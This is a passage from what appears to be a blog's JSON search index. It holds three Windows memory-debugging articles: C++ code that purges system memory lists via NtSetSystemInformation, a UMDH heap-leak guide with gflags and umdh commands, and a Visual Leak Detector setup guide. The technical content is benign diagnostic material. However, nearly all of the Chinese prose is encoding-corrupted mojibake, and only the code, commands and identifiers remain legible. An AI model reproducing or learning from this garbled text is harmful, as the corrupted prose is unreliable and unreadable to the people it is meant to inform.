(!pRtlNtStatusToDosError) &#123; return E_NOINTERFACE; &#125; // Working Sets -&gt; Modified Page List -&gt; Standby List SYSTEM_MEMORY_LIST_COMMAND CommandList[] = &#123; SYSTEM_MEMORY_LIST_COMMAND::MemoryEmptyWorkingSets, SYSTEM_MEMORY_LIST_COMMAND::MemoryFlushModifiedList, SYSTEM_MEMORY_LIST_COMMAND::MemoryPurgeStandbyList &#125;; NTSTATUS Status = STATUS_SUCCESS; for (size_t i = 0; i &lt; sizeof(CommandList) / sizeof(*CommandList); ++i) &#123; Status = pNtSetSystemInformation( SystemMemoryListInformation, &amp;CommandList[i], sizeof(SYSTEM_MEMORY_LIST_COMMAND)); if (!NT_SUCCESS(Status)) &#123; break; &#125; &#125; return Mile::HResult::FromWin32(pRtlNtStatusToDosError(Status)); &#125;&#125;EXTERN_C HRESULT WINAPI MoDefragMemory( _In_ PNSUDO_CONTEXT Context)&#123; Mile::HResult hr = S_OK; HANDLE CurrentProcessToken = INVALID_HANDLE_VALUE; if (::OpenProcessToken( ::GetCurrentProcess(), MAXIMUM_ALLOWED, &amp;CurrentProcessToken)) &#123; LUID_AND_ATTRIBUTES RawPrivilege; RawPrivilege.Attributes = SE_PRIVILEGE_ENABLED; if (::LookupPrivilegeValueW( nullptr, SE_PROF_SINGLE_PROCESS_NAME, &amp;RawPrivilege.Luid)) &#123; hr = Mile::AdjustTokenPrivilegesSimple( CurrentProcessToken, &amp;RawPrivilege, 1); if (hr.IsSucceeded()) &#123; hr = ::DefragMemory(); &#125; &#125; ::CloseHandle(CurrentProcessToken); &#125; return hr;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"å†…å­˜","slug":"å†…å­˜","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E5%AD%98/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å†…å­˜æ³„æ¼","slug":"A-OS/Windows/å†…å­˜æ³„æ¼","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"}]},{"title":"ã€å†…å­˜æ³„æ¼ã€‘ä½¿ç”¨ UMDH å®šä½ç”¨æˆ·æ¨¡å¼å†…å­˜æ³„æ¼","date":"2023-10-27T01:24:02.020Z","path":"A_OS/Windows/å†…å­˜æ³„æ¼/ã€å†…å­˜æ³„æ¼ã€‘å®šä½ UMDH/","text":"æ¦‚è¿°ï¼šä½¿ç”¨ UMDH åˆ†æå†…å­˜æ³„æ¼ [toc] UMDH UMDHï¼ˆç”¨æˆ·æ¨¡å¼è½¬å‚¨å †ï¼‰ï¼Œæ˜¯ä¸æ“ä½œç³»ç»Ÿä¸€èµ·ç”¨äºåˆ†æç‰¹æ€§è¿›ç¨‹Windowså †åˆ†é…ã€‚UMDHæŸ¥æ‰¾ç‰¹å®šè¿›ç¨‹ä¸­çš„å“ªä¸ªä¾‹ç¨‹æ­£åœ¨æ³„æ¼å†…å­˜ã€‚ç‰¹åˆ«è¦æ³¨æ„çš„äº‹ï¼šä½¿ç”¨UMDHæ˜¾ç¤ºå †æ ˆè·Ÿè¸ªæ•°æ®ä¹‹å‰ï¼Œå¿…é¡»ä½¿ç”¨ GFlags æ­£ç¡®é…ç½®ç³»ç»Ÿã€‚Windowsçš„è°ƒè¯•å·¥å…·ä¸­åŒ…å«äº† GFlagsã€‚ ä½¿ç”¨ å¯ç”¨ UMDH stack è·Ÿè¸ªï¼š åœ¨ GFlags å›¾å½¢ç•Œé¢ä¸­ï¼Œé€‰æ‹© â€œå›¾åƒæ–‡ä»¶â€ é€‰é¡¹å¡ï¼Œé”®å…¥è¿›ç¨‹åç§° (åŒ…æ‹¬æ–‡ä»¶æ‰©å±•å) ï¼ŒæŒ‰ TAB é”®ï¼Œé€‰æ‹© &quot; åˆ›å»ºç”¨æˆ·æ¨¡å¼å †æ ˆè·Ÿè¸ªæ•°æ®åº“&quot;ï¼Œç„¶åé€‰æ‹© &quot; åº”ç”¨&quot;ã€‚æˆ–è€…ï¼Œåœ¨å‘½ä»¤è¡Œç•Œé¢ä½¿ç”¨ gflags å‘½ä»¤è®¾ç½®ã€‚ 1gflags -i imageName +ust å½“å®Œæˆåˆ†æåï¼Œä½¿ç”¨ - æ¸…æ¥šè®¾ç½®ï¼š 1gflags -i imageName -ust é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨ x86 å¤„ç†å™¨ä¸Š Windows æ”¶é›†çš„å †æ ˆè·Ÿè¸ªæ•°æ®é‡é™åˆ¶ä¸º 32 MBï¼Œåœ¨ x64 å¤„ç†å™¨ä¸Šé™åˆ¶ä¸º 64 mbã€‚ å¦‚æœå¿…é¡»å¢åŠ æ­¤æ•°æ®åº“çš„å¤§å°ï¼Œè¯·é€‰æ‹© â€œGFlagsâ€ å›¾å½¢ç•Œé¢ä¸­çš„ &quot; æ˜ åƒæ–‡ä»¶ &quot; é€‰é¡¹å¡ï¼Œé”®å…¥è¿›ç¨‹åç§°ï¼ŒæŒ‰ tab é”®ï¼Œé€‰ä¸­ &quot; Stack Backtrace (Megs) &quot; å¤é€‰æ¡†ï¼Œåœ¨ â€œå…³è”â€ æ–‡æœ¬æ¡†ä¸­é”®å…¥å€¼ (ï¼Œä»¥) MB ä¸ºå•ä½ï¼‰ï¼Œç„¶åé€‰æ‹© &quot; åº”ç”¨&quot;ã€‚ ä»…åœ¨å¿…è¦æ—¶å¢åŠ æ­¤æ•°æ®åº“ï¼Œå› ä¸ºå®ƒå¯èƒ½ä¼šè€—å°½æœ‰é™çš„ Windows èµ„æºã€‚ å¦‚æœä¸å†éœ€è¦æ›´å¤§çš„å¤§å°ï¼Œåˆ™å°†æ­¤è®¾ç½®è¿”å›åˆ°å…¶åŸå§‹å€¼ã€‚ å¦‚æœæ›´æ”¹äº† â€œç³»ç»Ÿæ³¨å†Œè¡¨â€ é€‰é¡¹å¡ä¸Šçš„ä»»ä½•æ ‡å¿—ï¼Œåˆ™å¿…é¡»é‡æ–°å¯åŠ¨ Windows ä»¥ä½¿è¿™äº›æ›´æ”¹ç”Ÿæ•ˆã€‚ å¦‚æœæ›´æ”¹äº† &quot; å›¾åƒæ–‡ä»¶ &quot; é€‰é¡¹å¡ä¸Šçš„ä»»ä½•æ ‡å¿—ï¼Œåˆ™å¿…é¡»é‡æ–°å¯åŠ¨è¯¥è¿‡ç¨‹æ‰èƒ½ä½¿æ›´æ”¹ç”Ÿæ•ˆã€‚ å¯¹å†…æ ¸æ ‡å¿—é€‰é¡¹å¡æ‰€åšçš„æ›´æ”¹ä¼šç«‹å³ç”Ÿæ•ˆï¼Œä½†ä¸‹æ¬¡é‡æ–°å¯åŠ¨ Windowsï¼Œå®ƒä»¬ä¼šä¸¢å¤±ã€‚ åœ¨ä½¿ç”¨ UMDH ä¹‹å‰ï¼Œå¿…é¡»æœ‰æƒè®¿é—®åº”ç”¨ç¨‹åºçš„æ­£ç¡®ç¬¦å·ã€‚UMDH ä½¿ç”¨ç¯å¢ƒå˜é‡æŒ‡å®šçš„ç¬¦å·è·¯å¾„ _NT_SYMBOL_PATHã€‚å°†æ­¤å˜é‡è®¾ç½®ä¸ºåŒ…å«åº”ç”¨ç¨‹åºçš„ç¬¦å·çš„è·¯å¾„ã€‚å¦‚æœè¿˜åŒ…æ‹¬ Windows ç¬¦å·çš„è·¯å¾„ï¼Œåˆ™åˆ†æå¯èƒ½æ›´å®Œæ•´ã€‚æ­¤ç¬¦å·è·¯å¾„çš„è¯­æ³•ä¸è°ƒè¯•å™¨ä½¿ç”¨çš„è¯­æ³•ç›¸åŒã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ çš„åº”ç”¨ç¨‹åºçš„ç¬¦å·ä½äº C:\\MySymbolsï¼Œå¹¶ä¸”ä½ æƒ³è¦ä¸ºä½ çš„ Windows ç¬¦å·ä½¿ç”¨å…¬å…± Microsoft ç¬¦å·å­˜å‚¨åŒºï¼Œåˆ™ä½¿ç”¨ C:\\MyCache ä½œä¸ºä¸‹æ¸¸å­˜å‚¨ï¼Œä½ å°†ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è®¾ç½®ä½ çš„ç¬¦å·è·¯å¾„ï¼š 1set _NT_SYMBOL_PATH=c:\\mysymbols;srv*c:\\mycache*https://msdl.microsoft.com/download/symb æ­¤å¤–ï¼Œè‹¥éœ€è¦ç¡®ä¿å‡†ç¡®çš„ç»“æœï¼Œå¿…é¡»ç¦ç”¨ BSTR ç¼“å­˜ã€‚ä¸ºæ­¤ï¼Œè¯·å°† OANOCACHE ç¯å¢ƒå˜é‡çš„å€¼è®¾ç½®ä¸º 1ï¼ˆéœ€è¦åœ¨å¯åŠ¨è·Ÿè¸ªå…¶åˆ†é…çš„åº”ç”¨ç¨‹åºä¹‹å‰è¿›è¡Œè®¾ç½®ï¼‰ã€‚å¦‚æœéœ€è¦è·Ÿè¸ªæœåŠ¡æ‰€åšçš„åˆ†é…ï¼Œåˆ™å¿…é¡»å°† OANOCACHE è®¾ç½®ä¸ºè¥¿æˆç¯å¢ƒå˜é‡ï¼Œç„¶åé‡æ–°å¯åŠ¨ Windows ä»¥ä½¿æ­¤è®¾ç½®ç”Ÿæ•ˆã€‚ æ£€æµ‹é€šè¿‡ UMDH å¢åŠ çš„å †åˆ†é… 1. ç¡®è®¤è¿›ç¨‹ID (PID) 12# æŸ¥æ‰¾è¿›ç¨‹idtlist | finstr &quot;è¿›ç¨‹å&quot; 2. ä¿å­˜æ—¥å¿—æ–‡ä»¶ ä½¿ç”¨ UMDH åˆ†ææ­¤è¿›ç¨‹çš„å †å†…å­˜åˆ†é…ï¼Œå¹¶å°†å…¶ä¿å­˜åˆ°æ—¥å¿—æ–‡ä»¶ã€‚å°† -p å¼€å…³ä¸ PID ä¸€èµ·ä½¿ç”¨ï¼Œå¹¶å°† -f å¼€å…³ä¸æ—¥å¿—æ–‡ä»¶çš„åç§°ä¸€èµ·ä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ PID ä¸º123ï¼Œå¹¶ä¸”ä½ æƒ³è¦å°†æ—¥å¿—æ–‡ä»¶å‘½åä¸º Log1.txt ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 12# ä¿å­˜å¿«ç…§umdh -p:123 -f:log1.txt 3. æŸ¥çœ‹æ—¥å¿— ä½¿ç”¨è®°äº‹æœ¬æˆ–å…¶ä»–ç¨‹åºæ‰“å¼€æ—¥å¿—æ–‡ä»¶ã€‚ æ­¤æ–‡ä»¶åŒ…å«æ¯ä¸ªå †åˆ†é…çš„è°ƒç”¨å †æ ˆã€é€šè¿‡è¯¥è°ƒç”¨å †æ ˆè¿›è¡Œçš„åˆ†é…æ•°ï¼Œä»¥åŠé€šè¿‡è¯¥è°ƒç”¨å †æ ˆä½¿ç”¨çš„å­—èŠ‚æ•°ã€‚ 4. å‰åä¸¤æ¬¡æ—¥å¿—å¯¹æ¯”ç»“æœ ç”±äºæ‚¨æ­£åœ¨æŸ¥æ‰¾å†…å­˜æ³„æ¼ï¼Œå› æ­¤ï¼Œå•ä¸ªæ—¥å¿—æ–‡ä»¶çš„å†…å®¹æ˜¯ä¸å¤Ÿçš„ã€‚ ä½ å¿…é¡»æ¯”è¾ƒåœ¨ä¸åŒæ—¶é—´è®°å½•çš„æ—¥å¿—æ–‡ä»¶ï¼Œä»¥ç¡®å®šå“ªäº›åˆ†é…æ­£åœ¨å¢é•¿ã€‚ UMDH å¯ä»¥æ¯”è¾ƒä¸¤ä¸ªä¸åŒçš„æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶åœ¨å„è‡ªçš„åˆ†é…å¤§å°ä¸­æ˜¾ç¤ºæ›´æ”¹ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨å¤§äºç¬¦å· (&gt;) å°†ç»“æœé‡å®šå‘åˆ°ç¬¬ä¸‰ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚ ä½ å¯èƒ½è¿˜éœ€è¦åŒ…å«-d é€‰é¡¹ï¼Œè¯¥é€‰é¡¹å°†å­—èŠ‚å’Œåˆ†é…è®¡æ•°ä»åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ã€‚ ä¾‹å¦‚ï¼Œè‹¥è¦æ¯”è¾ƒ Log1.txt å’Œ Log2.txtï¼Œå°†æ¯”è¾ƒç»“æœä¿å­˜åˆ°æ–‡ä»¶ LogCompare.txtï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 1umdh log1.txt log2.txt &gt; logcompare.txt 5. åˆ†æå†…å­˜æ³„æ¼ 12+ 5320 ( f110 - 9df0) 3a allocs BackTrace00B53 Total increase == 5320 å¯¹äºæ¯ä¸ªè°ƒç”¨å †æ ˆ (åœ¨ UMDH æ—¥å¿—æ–‡ä»¶ä¸­æ ‡è®°ä¸º â€œBackTraceâ€ ) ï¼Œè¿™ä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ä¹‹é—´æœ‰æ¯”è¾ƒã€‚ åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œç¬¬ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ (Log1.txt) ä¸º BackTrace00B53 åˆ†é…çš„0x9DF0 å­—èŠ‚ï¼Œè€Œç¬¬äºŒä¸ªæ—¥å¿—æ–‡ä»¶è®°å½•äº†0xF110 å­—èŠ‚ï¼Œè¿™æ„å‘³ç€åœ¨æ•è·ä¸¤ä¸ªæ—¥å¿—çš„æ—¶é—´ä¹‹é—´åˆ†é…æœ‰0x5320 çš„é¢å¤–å­—èŠ‚ã€‚ è¿™äº›å­—èŠ‚æ¥è‡ª BackTrace00B53 æ ‡è¯†çš„è°ƒç”¨å †æ ˆã€‚ 6. æŸ¥çœ‹æ³„æ¼å †æ ˆ è‹¥è¦ç¡®å®šè¯¥ backtrace ä¸­çš„å†…å®¹ï¼Œè¯·æ‰“å¼€ä¸€ä¸ªåŸå§‹æ—¥å¿—æ–‡ä»¶ (ä¾‹å¦‚ Log2.txt) ï¼Œç„¶åæœç´¢ â€œBackTrace00B53â€ã€‚ç»“æœç±»ä¼¼äºä»¥ä¸‹æ•°æ®ï¼š 1234567891011121300005320 bytes in 0x14 allocations (@ 0x00000428) by: BackTrace00B53ntdll!RtlDebugAllocateHeap+0x000000FDntdll!RtlAllocateHeapSlowly+0x0000005Antdll!RtlAllocateHeap+0x00000808MyApp!_heap_alloc_base+0x00000069MyApp!_heap_alloc_dbg+0x000001A2MyApp!_nh_malloc_dbg+0x00000023MyApp!_nh_malloc+0x00000016MyApp!operator new+0x0000000EMyApp!DisplayMyGraphics+0x0000001EMyApp!main+0x0000002CMyApp!mainCRTStartup+0x000000FCKERNEL32!BaseProcessStart+0x0000003D ä¸Šè¿°æ³„æ¼å†…å­˜åˆ†æ: æ­¤ UMDH è¾“å‡ºæ˜¾ç¤ºæœ‰) (åè¿›åˆ¶21280ä»è°ƒç”¨å †æ ˆä¸­åˆ†é…çš„æ€»å­—èŠ‚æ•°ã€‚ è¿™äº›å­—èŠ‚æ˜¯ä» 0x14 (åè¿›åˆ¶ 20) å•ç‹¬åˆ†é…çš„ï¼Œæ¯ä¸ª 0x428 (åè¿›åˆ¶ 1064) å­—èŠ‚ã€‚ å°†ä¸ºè°ƒç”¨å †æ ˆæä¾› â€œBackTrace00B53â€ çš„æ ‡è¯†ç¬¦ï¼Œå¹¶æ˜¾ç¤ºæ­¤å †æ ˆä¸­çš„è°ƒç”¨ã€‚ åœ¨æ£€æŸ¥è°ƒç”¨å †æ ˆæ—¶ï¼Œå¯ä»¥çœ‹åˆ° DisplayMyGraphics ä¾‹ç¨‹æ­£åœ¨é€šè¿‡ new è¿ç®—ç¬¦åˆ†é…å†…å­˜ï¼Œè¯¥è¿ç®—ç¬¦è°ƒç”¨ä¾‹ç¨‹ mallocï¼Œåè€…ä½¿ç”¨ Visual C++ è¿è¡Œæ—¶åº“ä»å †ä¸­è·å–å†…å­˜ã€‚ ç¡®å®šè¦åœ¨æºä»£ç ä¸­æ˜¾å¼æ˜¾ç¤ºçš„æœ€åä¸€ä¸ªè°ƒç”¨ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒå¯èƒ½æ˜¯ new è¿ç®—ç¬¦ï¼Œå› ä¸ºè°ƒç”¨ malloc æ˜¯ä½œä¸º æ–° çš„å®ç°çš„ä¸€éƒ¨åˆ†è€Œä¸æ˜¯ä½œä¸ºå•ç‹¬çš„åˆ†é…ã€‚ å› æ­¤ï¼Œ DisplayMyGraphicsä¾‹ç¨‹ä¸­newè¿ç®—ç¬¦çš„æ­¤å®ä¾‹ä¼šé‡å¤åˆ†é…æœªé‡Šæ”¾çš„å†…å­˜ã€‚ å‚è€ƒé“¾æ¥ ä½¿ç”¨ UMDH æŸ¥æ‰¾ç”¨æˆ·æ¨¡å¼å†…å­˜æ³„æ¼ - Windows drivers | Microsoft Docs","tags":[{"name":"å†…å­˜","slug":"å†…å­˜","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E5%AD%98/"},{"name":"å†…å­˜æ³„æ¼","slug":"å†…å­˜æ³„æ¼","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"},{"name":"UMDH","slug":"UMDH","permalink":"https://hodlyounger.github.io/tags/UMDH/"},{"name":"Windows/WinDbg","slug":"Windows-WinDbg","permalink":"https://hodlyounger.github.io/tags/Windows-WinDbg/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å†…å­˜æ³„æ¼","slug":"A-OS/Windows/å†…å­˜æ³„æ¼","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"}]},{"title":"ã€ä¸€æ–‡ææ‡‚ã€‘VLD å†…å­˜æ³„æ¼å®šä½","date":"2023-10-27T01:24:02.016Z","path":"A_OS/Windows/å†…å­˜æ³„æ¼/ã€ä¸€æ–‡ææ‡‚ã€‘VLDæ£€æµ‹å†…å­˜æ³„æ¼/","text":"æ¦‚è¿°ï¼šVLD å®‰è£…åŠä½¿ç”¨ [toc] åŠå­¦åŠç»ƒï¼Œå®šä½äº†ä¸€æŠŠå†…å­˜æ³„æ¼çš„é—®é¢˜ã€‚ä¸»è¦ä½¿ç”¨ VLD è¿™ä¸ªå·¥å…·ã€‚ VLD ä¸‹è½½å®‰è£…å’Œä½¿ç”¨ 1. ä¸‹è½½å’Œå®‰è£… Visual Leak Detector | Enhanced Memory Leak Detection for Visual C++ ç‚¹å‡»ä¸Šæ–¹é“¾æ¥ä¸‹è½½å’Œå®‰è£… vld å·¥å…·ï¼Œè®°ä½å®‰è£…çš„ä½ç½®ï¼Œåç»­æœ‰å¾ˆå¤šæ–‡ä»¶ä¼šä½¿ç”¨åˆ°ï¼Œéœ€è¦æ‹·è´ç§»åŠ¨åˆ°ç›¸åº”çš„æ–‡ä»¶ä¸­ã€‚ 2. ä½¿ç”¨ å®‰è£…å®Œæˆåï¼Œæ‰¾åˆ°å®‰è£…æ‰€åœ¨çš„æ–‡ä»¶å¤¹ æ‰¾åˆ° visual studio ä¸­ æ ‡å‡†å¤´æ–‡æ–‡ä»¶ æ‰€åœ¨çš„æ–‡ä»¶å¤¹ï¼Œä¸€èˆ¬ä¼šåœ¨å¯¹åº”çš„ windows kits æ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°ã€‚å¦‚ï¼š C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.18362.0\\ucrtã€‚æ‹·è´å®‰è£…ç›®å½•ä¸‹ include ä¸­çš„ å¤´æ–‡ä»¶åˆ°è¯¥ç›®å½•ï¼Œæ³¨æ„æœ‰å‡ ä¸ª kits ç¯å¢ƒå°±å°½é‡æ‹·è´å‡ ä¸ªï¼Œä¸‡ä¸€ç”¨åˆ°å‘¢ æ‰¾åˆ° vs studio ä¸­ åº“æ–‡ä»¶ æ‰€åœ¨çš„æ–‡ä»¶å¤¹ï¼Œä¸€èˆ¬ä¼šåœ¨å¯¹åº”çš„ windows kits æ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°ã€‚å¦‚ï¼š C:\\Program Files (x86)\\Windows Kits\\10\\Lib\\(kits ç‰ˆæœ¬å·)\\um\\ã€‚æ‹·è´å®‰è£…ç›®å½•ä¸‹ lib ç›®å½•ä¸‹å¯¹åº”ä½æ•°çš„ lib æ–‡ä»¶åˆ° kits å¯¹åº”çš„ um\\x64æˆ–um\\x86 æ–‡ä»¶å¤¹ä¸­ã€‚ åˆ°è¿™ä¸€æ­¥ï¼Œåªè¦åœ¨ç¨‹åºä¸­å¼•å…¥ vld å¤´æ–‡ä»¶å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ã€‚ 1#include &lt;vld.h&gt; 3. åœ¨ vs2015 ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ä½¿ç”¨ å®‰è£…çš„æ—¶å€™å°±å¯ä»¥çœ‹åˆ° vld åªæ”¯æŒåˆ° vs2015ã€‚æ‰€ä»¥åœ¨ vs æ›´é«˜çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨æ—¶ï¼Œéœ€è¦ä¸€äº›é¢å¤–çš„æ“ä½œã€‚ å½±å“ï¼šåœ¨vsé«˜ç‰ˆæœ¬ä¸­ä½¿ç”¨æ—¶ï¼Œè™½ç„¶èƒ½å®šä½æ³„æ¼é—®é¢˜ï¼Œä½†æ˜¯ä¸æ˜¾ç¤ºæ–‡ä»¶åå’Œè¡Œå·ã€‚ è§£å†³åŠæ³•ï¼š åœ¨ vs å·¥ç¨‹è®¾ç½®ä¸­æŒ‰ä¸‹å›¾è®¾ç½®ï¼š 4. release æ¨¡å¼ä¸‹è¿›è¡Œå†…å­˜æ³„æ¼æ£€æµ‹ åœ¨ Debug æ¨¡å¼ä¸‹ï¼Œç›´æ¥åœ¨å·¥ç¨‹ä¸­æºæ–‡ä»¶ä¸­ä»»æ„ä½ç½®å¼•å…¥ &lt;vld.h&gt; å³å¯ï¼Œç¼–è¯‘ä¹‹åçš„å¯æ‰§è¡Œæ–‡ä»¶å°±å¸¦æœ‰æ³„æ¼æ£€æµ‹çš„åŠŸèƒ½ã€‚ ä½†æ˜¯åœ¨ Release æ¨¡å¼ä¸‹åˆ™éœ€è¦åšä¸€ä¸‹é¢å¤–çš„å¤„ç†ã€‚ åŒ Debug ç‰ˆæœ¬åœ¨ VS ä¸­ä¸€æ ·é…ç½®å¥½ VLD çš„ç›¸å…³ä¿¡æ¯ æ‹·è´ VLD å®‰è£…ç›®å½•ä¸‹ bin\\win32 ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶å’Œ vld.ini åˆ°å·¥ç¨‹ç›®æ ‡è·¯å¾„ä¸‹(å¯æ‰§è¡Œæ–‡ä»¶çš„ç›®å½•)ã€‚ åœ¨ç¨‹åºå…¥å£å¤„çš„ cpp æ–‡ä»¶ä¸­ï¼Œå®šä¹‰å¼ºåˆ¶æ£€æµ‹å®å’ŒåŒ…å« vld å¤´æ–‡ä»¶ 12#define VLD_FORCE_ENABLE#include &lt;vld.h&gt; åœ¨ç¨‹åºå¯åŠ¨å’Œé€€å‡ºæ—¶ï¼Œåˆ†åˆ«å¢åŠ ä»¥ä¸‹å‡½æ•°è°ƒç”¨ 1234567&#123; ... VLDGlobalEnable(); VLDReportLeaks(); //some code... VLDGlobalDisable();&#125; ä¿®æ”¹é…ç½®æ–‡ä»¶ é…ç½®æ‰§è¡Œç¯å¢ƒ åœ¨å•ç‹¬è¿è¡Œçš„ç¯å¢ƒä¸­ï¼Œè¿˜éœ€è¦åœ¨ç¨‹åºæ‰§è¡Œç›®å½•æ·»åŠ ä»¥ä¸‹ 12345678dbghelp.dllMicrosoft.DTfW.DHL.manifestvld_x86.dllvld_x86.pdbvld.ini# é™¤æ­¤ä¹‹å¤–è¿˜æœ‰å¯èƒ½éœ€è¦api-ms-win-core-winrt-l1-1-0.dll å¢åŠ æ£€æµ‹æ¨¡å— ä»¥ä¸Šé…ç½®åï¼Œé»˜è®¤æƒ…å†µä¸‹åªä¼šæ£€æµ‹ä¸»çº¿ç¨‹çš„æ¨¡å—ï¼Œè¦æƒ³å¢åŠ å…¶ä»–æ¨¡å—çš„å†…å­˜æ³„æ¼æ£€æµ‹ï¼Œéœ€è¦é…ç½® vld.ini é…ç½®æ–‡ä»¶ä¸­çš„ ForceIncludeModules é…ç½®é¡¹ã€‚åœ¨è¯¥é…ç½®é¡¹åå¢åŠ éœ€è¦æ£€æµ‹çš„æ¨¡å—ã€‚å¦‚ï¼šForceIncludeModules=demo1.dll;demo2.dll é…ç½®è¾“å‡ºæ–¹å¼ åŒæ ·è¿˜æ˜¯é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ã€‚è®¾ç½®é…ç½®æ–‡ä»¶ä¸­ ReportTo çš„å€¼å³å¯ï¼š debuggerï¼šæ§åˆ¶å° file: æ–‡ä»¶ ï¼ˆé»˜è®¤ä¼šè¾“å‡ºåœ¨è¿è¡Œç¨‹åºçš„ç›®å½•ä¸‹ï¼Œä¹Ÿå¯èƒ½ä¼šè¾“å‡ºåœ¨ syswow64 è¿™ä¸ªç³»ç»Ÿç›®å½•ä¸‹ï¼ŒWin+R è¾“å…¥ syswow64å³å¯æ‰“å¼€è¿™ä¸ªç›®å½•ã€‚é»˜è®¤æ–‡ä»¶åï¼šmemory_leak_report.txtï¼‰ bothï¼šæ§åˆ¶å°å’Œæ–‡ä»¶ å…³äº VLD çš„é…ç½®æ–‡ä»¶ï¼š Vld çš„åº“ä¼šæ£€æŸ¥ç¨‹åºæ‰€è¿è¡Œçš„å½“å‰ç›®å½•æ˜¯å¦å­˜åœ¨ vld.ini çš„é…ç½®æ–‡ä»¶ï¼Œå¦‚æœæœ‰ï¼Œåˆ™åŠ è½½é‡Œå¤´çš„é…ç½®è¿›è¡Œå†…å­˜æ£€æµ‹è¿è¡Œï¼Œå¦‚æœæ²¡æœ‰å–é»˜è®¤çš„é…ç½®å‚æ•°è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨å°† vld.ini çš„æ–‡ä»¶æ‹·è´åˆ°ç¨‹åºçš„è¿è¡Œç›®å½•ä¸­å³å¯ã€‚ å…³äº vld.ini çš„å‡ ä¸ªæ³¨æ„çš„å‚æ•°ï¼š VLD = on æ€»å¼€å…³ï¼Œæ˜¯å¦å¯ç”¨ VLD åŠŸèƒ½ï¼Œé»˜è®¤ä¸º yes MaxDataDump = 256 ç”¨æ¥æ˜¾ç¤ºæ£€æµ‹åˆ°çš„å†…åœ¨æ³„éœ²çš„å—çš„åœ°å€å¤§å°ï¼Œé»˜è®¤256ï¼Œå…¶å®å°±æ˜¯æ˜¾ç¤ºå¤šå°‘ä¸ªbyteçš„å†…å®¹ã€‚ MaxTraceFrames = 64 è®¾ç½® VLD æ£€æµ‹åˆ°å †æ ˆçš„æœ€å¤§å±‚æï¼Œä¹Ÿå°±æ˜¯frameçš„æ·±åº¦ ReportFile = xxxè®¾ç½® VLD ç”ŸæˆæŠ¥å‘Šçš„ä½ç½®å’ŒæŠ¥å‘Šçš„æ–‡ä»¶åï¼Œé»˜è®¤ä¸ºï¼š.\\memory_leak_report.txt ï¼Œç¨‹åºå½“å‰è¿è¡Œç›®å½•ä¸­ã€‚ ReportTo = debugger è®¾ç½® VLD ç”ŸæˆæŠ¥å‘Šçš„æ–¹å¼ï¼Œdebuggerä¸ºåœ¨æ§åˆ¶å°è¾“å‡º VLD çš„æŠ¥å‘Šä¿¡æ¯ï¼Œfileåœ¨æŒ‡å®šç›®å½•ä¸‹ç”ŸæˆæŠ¥å‘Šæ–‡ä»¶ï¼Œbothä¸ºå³è¾“å‡ºä¹Ÿç”ŸæˆæŠ¥å‘Šã€‚å¦‚æœä½ çš„ç¨‹åºä¸ºå¸¦çª—ä½“çš„ç¨‹åºï¼Œéœ€è¦è®¾ç½®ä¸ºfileæˆ–both. é—®é¢˜1ï¼šä¸æ˜¾ç¤ºæ–‡ä»¶åå’Œè¡Œå· ç¼ºå°‘ pdb æ–‡ä»¶ å¦‚æœç¨‹åºè¿è¡Œä¹‹åç”Ÿæˆçš„ memory_leak_report ä¸­è¿˜æ˜¯ä¸æ˜¾ç¤ºè¡Œå·ï¼Œåˆ™è¯•è¯•æŠŠpdbæ–‡ä»¶æ”¾åœ¨ç¨‹åºçš„è¿è¡Œç›®å½•è¯•è¯•ã€‚ å‚è€ƒæ–‡ç«  ã€VS2019ã€‘C/C++å†…å­˜æ³„æ¼æ£€æµ‹å·¥å…·ï¼šVisual Leak Detectorè¶…è¯¦ç»†å®‰è£…æ•™ç¨‹ï¼ˆfor windowsï¼‰_æ‰§è¡Œxçš„åšå®¢-CSDNåšå®¢_vs2019å†…å­˜æ³„æ¼æ£€æµ‹ ä½¿ç”¨VLDè¿›è¡Œå†…å­˜æ³„æ¼æ£€æµ‹(release + debug)_OH,CGWLMXUPçš„åšå®¢-CSDNåšå®¢_release 